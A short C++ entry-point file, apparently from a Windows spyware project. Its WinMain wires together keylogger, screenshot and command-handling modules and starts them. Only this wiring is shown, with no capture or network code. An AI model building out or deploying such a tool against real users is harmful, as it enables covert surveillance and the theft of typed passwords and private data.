// Filename: engine.cpp
// Author:   Patryk Połeć

#include "engine.h"

int WINAPI WinMain(HINSTANCE _hInstance, HINSTANCE _hPrevInstance, LPSTR _lpCmdLine, int _nCmdShow)
{
	C_Base          *objBase          = new C_Base();
	C_Command       *objCommand       = new C_Command(objBase);
	C_Keylogger     *objKeylogger     = new C_Keylogger(objBase);
	C_Screenshooter *objScreenshooter = new C_Screenshooter(objBase);
	C_Application   *objApplication   = new C_Application(objBase, objCommand, objKeylogger, objScreenshooter);

	objApplication->Start();

	delete objApplication;
	delete objScreenshooter;
	delete objKeylogger;
	delete objCommand;
	delete objBase;

    return 0;
}
